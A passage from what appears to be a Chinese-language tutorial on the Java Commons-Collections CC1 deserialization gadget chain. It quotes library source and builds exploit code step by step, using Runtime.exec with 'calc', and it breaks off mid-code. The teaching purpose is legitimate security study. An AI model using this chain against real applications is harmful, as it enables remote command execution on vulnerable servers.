<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="355f9ccf4d37973c87d74ab8f1c5a17d">CommonsCollections反序列化：</h1>
<h2 data-content="1" id="3628418542bd8a983bd2e3bacd02655c">反序列化漏洞原理：</h2>
<p>写了一个流程图可供理解：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712234848-9758d9f0-20cb-1.png"/></p>
<p>版本：jdk8u65版本（从jdk8u71开始，就有漏洞修复了）</p>
<p>详细配置信息见：<a href="https://xz.aliyun.com/t/12669" target="_blank">https://xz.aliyun.com/t/12669</a></p>
<h2 data-content="1" id="7ca57ca3635e045e454c1c3edb2f35ee">CommonsCollections1：</h2>
<p>利用点：</p>
<p>在<code>commons-collections</code>包下面有一个<code>Transformer</code>类：</p>
<p>可以看到它主要的用途就是接收一个对象，然后调用<code>transform</code>方法对对象进行操作</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712234940-b6331926-20cb-1.png"/></p>
<p>于是我们来找一下Transformer的实现类都有哪些：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712234923-ac49c22a-20cb-1.png"/></p>
<h3 data-content="1" id="7d6b7545aab504532fda71446ea9e04e">失败利用:</h3>
<p>我们来看一下NOPTransformer对应的内容是否有我们能够利用的点：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">NOPTransformer</span> <span class="kd">implements</span> <span class="n">Transformer</span><span class="o">,</span> <span class="n">Serializable</span> <span class="o">{</span>

    <span class="cm">/**</span>
<span class="cm">     * Transforms the input to result by doing nothing.</span>
<span class="cm">     * </span>
<span class="cm">     * @param input  the input object to transform</span>
<span class="cm">     * @return the transformed result which is the input</span>
<span class="cm">     */</span>
    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">transform</span><span class="o">(</span><span class="n">Object</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">input</span><span class="o">;</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></div>
<p>可以发现它对应的构造方法只是返回了input的值，并没有什么用，这里我们就利用不了。</p>
<p>再来看一下ConstantTransformer：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ConstantTransformer</span> <span class="kd">implements</span> <span class="n">Transformer</span><span class="o">,</span> <span class="n">Serializable</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="kd">final</span> <span class="n">Object</span> <span class="n">iConstant</span><span class="o">;</span>
    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">transform</span><span class="o">(</span><span class="n">Object</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">iConstant</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
<p>可以发现返回的是一个常量，也没有什么作用。</p>
<h3 data-content="1" id="b11de4772a6d0ed8f3090a156530372d">危险利用类：</h3>
<ul>
<li>我们可以发现这里接收一个对象，然后进行反射调用，然后对应的方法，参数类型，以及参数都是我们可控的，这里就非常符合我们反序列化漏洞里面的标准：任意方法调用</li>
</ul>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">InvokerTransformer</span> <span class="kd">implements</span> <span class="n">Transformer</span><span class="o">,</span> <span class="n">Serializable</span> <span class="o">{</span>

    <span class="cm">/**</span>
<span class="cm">     * Transforms the input to result by invoking a method on the input.</span>
<span class="cm">     * </span>
<span class="cm">     * @param input  the input object to transform</span>
<span class="cm">     * @return the transformed result, null if null input</span>
<span class="cm">     */</span>
    <span class="kd">public</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="n">String</span> <span class="n">methodName</span><span class="o">,</span> <span class="n">Class</span><span class="o">[]</span> <span class="n">paramTypes</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">();</span>
        <span class="n">iMethodName</span> <span class="o">=</span> <span class="n">methodName</span><span class="o">;</span>
        <span class="n">iParamTypes</span> <span class="o">=</span> <span class="n">paramTypes</span><span class="o">;</span>
        <span class="n">iArgs</span> <span class="o">=</span> <span class="n">args</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">transform</span><span class="o">(</span><span class="n">Object</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">input</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">Class</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">input</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
            <span class="n">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="n">cls</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="n">iMethodName</span><span class="o">,</span> <span class="n">iParamTypes</span><span class="o">);</span>
            <span class="k">return</span> <span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">input</span><span class="o">,</span> <span class="n">iArgs</span><span class="o">);</span>

        <span class="o">...</span>
</pre></div>
<h4 data-content="1" id="cbf7ec726df54619d49dcd405c5ec294">利用验证：</h4>
<p>我们知道RCE的命令对应的是</p>
<div class="highlight"><pre><span></span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"calc"</span><span class="o">);</span>
</pre></div>
<p>然后反射对应的是：</p>
<div class="highlight"><pre><span></span><span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span><span class="c1">//单例模式，通过对应方法创建对象</span>
<span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
<span class="n">Method</span> <span class="n">execMethod</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
<span class="n">execMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">r</span><span class="o">,</span><span class="s">"calc"</span><span class="o">);</span>
</pre></div>
<p>因为我们发现的<code>InvokerTransformer</code>能够通过反射来调用方法，所以我们尝试能不能用<code>InvokerTransformer</code>里面的<code>transform</code>来执行命令</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">exp</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC1Test</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
<span class="c1">//      Runtime.getRuntime().exec("calc");命令执行对应的命令；</span>
        <span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span><span class="c1">//单例模式，通过对应方法创建对象</span>
<span class="c1">//      Class c = Runtime.class;</span>
<span class="c1">//      Method execMethod = c.getMethod("exec",String.class);</span>
<span class="c1">//      execMethod.invoke(r,"calc");</span>

<span class="c1">//      危险类利用测试：我们先调用InvokerTransformer的类,传入对应的参数，再找到对应的构造函数</span>
<span class="c1">//      public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)//传参对应的是规定类型的数组，用来存放参数类型和参数值，所以我们要用它给的形式来进行传参；</span>
        <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">}).</span><span class="na">transform</span><span class="o">(</span><span class="n">r</span><span class="o">);</span>

    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h3 data-content="1" id="06988c3b276daee929514037101321ac">调用链：</h3>
<h4 data-content="1" id="a7f0cda63f8fad2afc036d2f2e5fc6d3">后半条链：</h4>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712234956-bfddba44-20cb-1.png"/></p>
<ul>
<li>我们已经找到了InvokerTransformer.transform中能够调用危险方法，所以我们就需要往前找一个能调用transform的类：</li>
<li>这里我们要找的就是对应的不同名字调用transform，这样我们就能再往前找不同的类，所以这里transform调用transform的就没有很大的价值了</li>
</ul>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235004-c4a559ec-20cb-1.png"/></p>
<ul>
<li>然后我们找到了这样一个地方来进行<code>transform</code>的调用，如果<code>valueTransformer</code>能够控制为我们的<code>Invokertransformer</code>，我们就可以利用<code>checkSetValue</code>调用后面的危险方法：</li>
</ul>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235010-c81586b0-20cb-1.png"/></p>
<ul>
<li>所以我们来跟进一下对应的<code>valueTransformer</code>：</li>
</ul>
<div class="highlight"><pre><span></span><span class="kd">protected</span> <span class="nf">TransformedMap</span><span class="o">(</span><span class="n">Map</span> <span class="n">map</span><span class="o">,</span> <span class="n">Transformer</span> <span class="n">keyTransformer</span><span class="o">,</span> <span class="n">Transformer</span> <span class="n">valueTransformer</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">(</span><span class="n">map</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">keyTransformer</span> <span class="o">=</span> <span class="n">keyTransformer</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">valueTransformer</span> <span class="o">=</span> <span class="n">valueTransformer</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
<ul>
<li>因为我们发现<code>TransformedMap</code>是一个<code>protected</code>方法，所以我们在他自己类中找哪个地方能够调用<code>TransformedMap</code>：</li>
</ul>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="n">Map</span> <span class="nf">decorate</span><span class="o">(</span><span class="n">Map</span> <span class="n">map</span><span class="o">,</span> <span class="n">Transformer</span> <span class="n">keyTransformer</span><span class="o">,</span> <span class="n">Transformer</span> <span class="n">valueTransformer</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="k">new</span> <span class="n">TransformedMap</span><span class="o">(</span><span class="n">map</span><span class="o">,</span> <span class="n">keyTransformer</span><span class="o">,</span> <span class="n">valueTransformer</span><span class="o">);</span>
    <span class="o">}</span>
</pre></div>
<ul>
<li>
<p>通过这里我们就可以发现，对应的<code>valuetransformer</code>我们可控，可以通过<code>TranformerMap</code>类中的<code>decorate</code>类传入<code>invokertansformdMap</code>，<code>checkSetValue</code>内部参数的问题解决了，我们就需要继续寻找调用链，找哪里能够调用<code>checkSetValue</code>:</p>
</li>
<li>
<p>我们发现<code>AbstractlnputCheckedMapDecorator</code>类其实对应的是<code>TransformedMap</code>的父类：</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">TransformedMap</span>
        <span class="kd">extends</span> <span class="n">AbstractInputCheckedMapDecorator</span>
        <span class="kd">implements</span> <span class="n">Serializable</span> <span class="o">{</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235022-cf5d6d7a-20cb-1.png"/></p>
<div class="highlight"><pre><span></span><span class="kd">static</span> <span class="kd">class</span> <span class="nc">MapEntry</span> <span class="kd">extends</span> <span class="n">AbstractMapEntryDecorator</span> <span class="o">{</span>

        <span class="cm">/* The parent map */</span>
        <span class="kd">private</span> <span class="kd">final</span> <span class="n">AbstractInputCheckedMapDecorator</span> <span class="n">parent</span><span class="o">;</span>

        <span class="kd">protected</span> <span class="nf">MapEntry</span><span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span> <span class="n">entry</span><span class="o">,</span> <span class="n">AbstractInputCheckedMapDecorator</span> <span class="n">parent</span><span class="o">)</span> <span class="o">{</span>
            <span class="kd">super</span><span class="o">(</span><span class="n">entry</span><span class="o">);</span>
            <span class="k">this</span><span class="o">.</span><span class="na">parent</span> <span class="o">=</span> <span class="n">parent</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="kd">public</span> <span class="n">Object</span> <span class="nf">setValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">value</span> <span class="o">=</span> <span class="n">parent</span><span class="o">.</span><span class="na">checkSetValue</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
            <span class="k">return</span> <span class="n">entry</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
</pre></div>
<ul>
<li>Entry其实就是map遍历的时候的一个键值对，map其实我们可以类似理解为一个数组，我们通常把一个entry叫做键值对,这里就是一个遍历map的一个方法：</li>
</ul>
<div class="highlight"><pre><span></span><span class="k">for</span><span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span> <span class="n">entry</span><span class="o">:</span><span class="n">map</span><span class="o">.</span><span class="na">entrySet</span><span class="o">()){</span>
    <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
<span class="o">}</span>
</pre></div>
<ul>
<li>所以我们可以发现MapEntry类中的<code>setValue</code>方法其实就是<code>Map</code>里面的setValue方法，这是这里放到MapEntry里面进行了重写，它继承了<code>AbstractMapEntryDecorator</code>这个类，这个类又引入了Map.Entry接口，还存在<code>setValue</code>方法，所以我们只需要进行常用的Map遍历，就可以调用<code>setValue</code>方法,然后调用<code>checkSetValue</code>方法:</li>
</ul>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">AbstractMapEntryDecorator</span> <span class="kd">implements</span> <span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">,</span> <span class="n">KeyValue</span> <span class="o">{</span>

    <span class="cm">/** The &lt;code&gt;Map.Entry&lt;/code&gt; to decorate */</span>
    <span class="kd">protected</span> <span class="kd">final</span> <span class="n">Map</span><span class="o">.</span><span class="na">Entry</span> <span class="n">entry</span><span class="o">;</span>

    <span class="kd">public</span> <span class="nf">AbstractMapEntryDecorator</span><span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span> <span class="n">entry</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">entry</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="s">"Map Entry must not be null"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">this</span><span class="o">.</span><span class="na">entry</span> <span class="o">=</span> <span class="n">entry</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="cm">/**</span>
<span class="cm">     * Gets the map being decorated.</span>
<span class="cm">     * </span>
<span class="cm">     * @return the decorated map</span>
<span class="cm">     */</span>
    <span class="kd">protected</span> <span class="n">Map</span><span class="o">.</span><span class="na">Entry</span> <span class="nf">getMapEntry</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">entry</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="c1">//-----------------------------------------------------------------------</span>
    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getKey</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getValue</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">setValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">entry</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
    <span class="o">}</span>
</pre></div>
<h4 data-content="1" id="fb431a16f303507dccce202db82606da">利用验证：</h4>
<p>这里就能够测试一下到此为止我们的调用链是否成立：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">exp</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC1Test</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
        <span class="c1">//Runtime.getRuntime().exec("calc");命令执行对应的命令；</span>
        <span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span><span class="c1">//单例模式，通过对应方法创建对象</span>
<span class="c1">//        Class c = Runtime.class;</span>
<span class="c1">//        Method execMethod = c.getMethod("exec",String.class);</span>
<span class="c1">//        execMethod.invoke(r,"calc");</span>

        <span class="c1">//危险类利用测试：我们先调用InvokerTransformer的类,传入对应的参数，再找到对应的构造函数</span>
        <span class="c1">//public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)//传参对应的是规定类型的数组，用来存放参数类型和参数值，所以我们要用它给的形式来进行传参；</span>
        <span class="n">InvokerTransformer</span> <span class="n">invokerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">});</span>
        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span><span class="c1">//new一个map</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"key"</span><span class="o">,</span><span class="s">"value"</span><span class="o">);</span><span class="c1">//对map进行赋值</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">transformedmap</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="n">invokerTransformer</span><span class="o">);</span>
        <span class="k">for</span><span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span> <span class="n">entry</span><span class="o">:</span><span class="n">transformedmap</span><span class="o">.</span><span class="na">entrySet</span><span class="o">()){</span><span class="c1">//将transformedmap传进去，会自动调用到父类里面的setValue方法：</span>
            <span class="n">entry</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="n">r</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h4 data-content="1" id="edf29186637766dc59c7c0bf11911c56">前半条链：</h4>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235051-e0a859a0-20cb-1.png"/></p>
<p>然后我们需要找到一个能够遍历<code>map</code>的方法，且能把<code>transformedmap</code>传进去，最好就是能够找到某个类的<code>readObject</code>里面遍历map时调用了<code>setValue</code>：</p>
<p>然后结果我们就找到了：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235056-e3cf64ca-20cb-1.png"/></p>
<p>这里恰好是一个Map.Entry的形式，然后在遍历map以后使用了setValue：</p>
<div class="highlight"><pre><span></span><span class="k">for</span> <span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">memberValue</span> <span class="o">:</span> <span class="n">memberValues</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">memberValue</span><span class="o">.</span><span class="na">getKey</span><span class="o">();</span>
            <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">memberType</span> <span class="o">=</span> <span class="n">memberTypes</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">memberType</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>  <span class="c1">// i.e. member still exists</span>
                <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">memberValue</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
                <span class="k">if</span> <span class="o">(!(</span><span class="n">memberType</span><span class="o">.</span><span class="na">isInstance</span><span class="o">(</span><span class="n">value</span><span class="o">)</span> <span class="o">||</span>
                      <span class="n">value</span> <span class="k">instanceof</span> <span class="n">ExceptionProxy</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">memberValue</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span>
                        <span class="k">new</span> <span class="n">AnnotationTypeMismatchExceptionProxy</span><span class="o">(</span>
                            <span class="n">value</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">+</span> <span class="s">"["</span> <span class="o">+</span> <span class="n">value</span> <span class="o">+</span> <span class="s">"]"</span><span class="o">).</span><span class="na">setMember</span><span class="o">(</span>
                                <span class="n">annotationType</span><span class="o">.</span><span class="na">members</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">name</span><span class="o">)));</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
</pre></div>
<p>那我们就重点来关注这个<code>AnnotationlnvocationHandler</code>类中我们有什么可控的点，在他的构造函数中我们可以发现，<code>Map</code>我们完全可控，那我们就可以将前面的<code>transformedmap</code>构造进去：</p>
<p>但是这里注意一点，这里没有表明<code>public</code>类，所以我们只能通过反射来进行获取：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">sun.reflect.annotation</span><span class="o">;</span>
<span class="kd">class</span> <span class="nc">AnnotationInvocationHandler</span> <span class="kd">implements</span> <span class="n">InvocationHandler</span><span class="o">,</span> <span class="n">Serializable</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="mi">6182022883658399397L</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">Annotation</span><span class="o">&gt;</span> <span class="n">type</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kd">final</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">memberValues</span><span class="o">;</span>

    <span class="n">AnnotationInvocationHandler</span><span class="o">(</span><span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">Annotation</span><span class="o">&gt;</span> <span class="n">type</span><span class="o">,</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">memberValues</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Class</span><span class="o">&lt;?&gt;[]</span> <span class="n">superInterfaces</span> <span class="o">=</span> <span class="n">type</span><span class="o">.</span><span class="na">getInterfaces</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(!</span><span class="n">type</span><span class="o">.</span><span class="na">isAnnotation</span><span class="o">()</span> <span class="o">||</span>
            <span class="n">superInterfaces</span><span class="o">.</span><span class="na">length</span> <span class="o">!=</span> <span class="mi">1</span> <span class="o">||</span>
            <span class="n">superInterfaces</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">!=</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">Annotation</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">AnnotationFormatError</span><span class="o">(</span><span class="s">"Attempt to create proxy for a non-annotation type."</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">type</span> <span class="o">=</span> <span class="n">type</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">memberValues</span> <span class="o">=</span> <span class="n">memberValues</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">exp</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC1Test</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
        <span class="c1">//Runtime.getRuntime().exec("calc");命令执行对应的命令；</span>
        <span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span><span class="c1">//单例模式，通过对应方法创建对象</span>
<span class="c1">//        Class c = Runtime.class;</span>
<span class="c1">//        Method execMethod = c.getMethod("exec",String.class);</span>
<span class="c1">//        execMethod.invoke(r,"calc");</span>

        <span class="c1">//危险类利用测试：我们先调用InvokerTransformer的类,传入对应的参数，再找到对应的构造函数</span>
        <span class="c1">//public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)//传参对应的是规定类型的数组，用来存放参数类型和参数值，所以我们要用它给的形式来进行传参；</span>
        <span class="n">InvokerTransformer</span> <span class="n">invokerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">});</span>
        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span><span class="c1">//new一个map</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"key"</span><span class="o">,</span><span class="s">"value"</span><span class="o">);</span><span class="c1">//对map进行赋值</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">transformedmap</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="n">invokerTransformer</span><span class="o">);</span>
        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
        <span class="n">Constructor</span> <span class="n">annotationInvocationhdlConstructor</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">annotationInvocationhdlConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
